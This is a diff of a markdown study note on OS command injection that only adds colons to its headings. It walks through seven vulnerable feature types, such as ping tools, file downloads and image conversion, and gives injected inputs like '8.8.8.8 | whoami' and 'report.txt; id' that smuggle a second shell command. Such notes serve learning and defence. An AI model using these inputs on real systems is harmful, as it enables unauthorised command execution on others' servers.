@@ -65,22 +65,22 @@ productID=2&storeID=1|whoami
 
 ### 1️⃣ Network Diagnostic Features (Most Common)
 
-*Scenario*  
+*Scenario:*  
 A website allows users to test connectivity.
 
-*Example Endpoint*
+*Example Endpoint:*
 
 /ping?host=8.8.8.8
 
-*Backend Logic*
+*Backend Logic:*
 
 ping -c 3 <user_input>
 
-*Attacker Input*
+*Attacker Input:*
 
 8.8.8.8 | whoami
 
-*Impact*
+*Impact:*
 - Command execution
 - Server user disclosure
 - Easy RCE
@@ -89,18 +89,18 @@ ping -c 3 <user_input>
 
 ### 2️⃣ Stock / Inventory Systems (Your Lab)
 
-*Scenario*  
+*Scenario:*  
 Legacy system checks product availability.
 
-*Backend*
+*Backend:*
 
 stockreport.pl productID storeID
 
-*Attacker Input*
+*Attacker Input:*
 
 productID=2&storeID=1|whoami
 
-*Impact*
+*Impact:*
 - Arbitrary command execution
 - Data exfiltration
 - Full backend compromise
@@ -109,18 +109,18 @@ productID=2&storeID=1|whoami
 
 ### 3️⃣ File Management Systems
 
-*Scenario*  
+*Scenario:*  
 Admin panel reads logs or exports files.
 
-*Endpoint*
+*Endpoint:*
 
 /download?file=report.txt
 
-*Attacker Input*
+*Attacker Input:*
 
 report.txt; id
 
-*Impact*
+*Impact:*
 - File system access
 - User enumeration
 - Data leakage
@@ -129,18 +129,18 @@ report.txt; id
 
 ### 4️⃣ Image / Media Processing
 
-*Scenario*  
+*Scenario:*  
 Server resizes or converts images.
 
-*Backend*
+*Backend:*
 
 convert <filename> -resize 200x200
 
-*Attacker Input*
+*Attacker Input:*
 
 image.jpg; whoami
 
-*Impact*
+*Impact:*
 - RCE via image tools (ImageMagick, etc.)
 - Very common in bug bounties
 
@@ -148,18 +148,18 @@ image.jpg; whoami
 
 ### 5️⃣ Backup / Maintenance Endpoints (HIGH RISK)
 
-*Scenario*  
+*Scenario:*  
 Admin triggers backups or cleanup tasks.
 
-*Endpoints*
+*Endpoints:*
 
 /backup /cleanup /run-task
 
-*Attacker Input*
+*Attacker Input:*
 
 backup && whoami
 
-*Impact*
+*Impact:*
 - 🚨 Full server takeover
 - 🚨 Often runs as root
 
@@ -167,18 +167,18 @@ backup && whoami
 
 ### 6️⃣ URL Fetch / Import Features
 
-*Scenario*  
+*Scenario:*  
 Application fetches data from user-provided URL.
 
-*Endpoint*
+*Endpoint:*
 
 /fetch?url=http://example.com
 
-*Attacker Input*
+*Attacker Input:*
 
 http://test.com | whoami
 
-*Impact*
+*Impact:*
 - RCE
 - SSRF + OSCI combo
 
@@ -186,16 +186,16 @@ http://test.com | whoami
 
 ### 7️⃣ API Endpoints (JSON / XML)
 
-*Scenario*  
+*Scenario:*  
 Backend processes system tasks via API.
 
-*Payload*
+*Payload:*
 ```json
 {
   "host": "8.8.8.8; whoami"
 }
 ```
-*Impact*
+*Impact:*
 - Silent RCE
 - Often overlooked by developers
 
